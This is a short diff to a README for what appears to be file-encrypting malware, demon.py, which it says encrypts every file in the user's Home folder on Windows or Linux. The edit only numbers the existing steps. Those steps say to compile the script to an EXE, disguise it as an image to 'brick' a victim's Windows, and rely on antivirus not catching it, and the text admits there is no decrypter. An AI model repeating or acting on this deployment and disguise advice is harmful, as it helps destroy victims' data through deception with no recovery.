@@ -5,13 +5,14 @@ Encrypts every file in your Home.
 
 ***
 
-Works on both Windows and Linux.
+0. Works on both Windows and Linux.
 
-Run server > run demon.py
+1. Run server > run demon.py
 
-Compile demon.py to EXE, make it a nice image or some shit and brick your Windows.
+2. Compile demon.py to EXE, make it a nice image or some shit and brick your Windows.
 
-Anti-virusses don't give a damn.
+3. Anti-virusses don't give a damn.
 
+***
 
 Maybe Ill add a decrypter someday also.
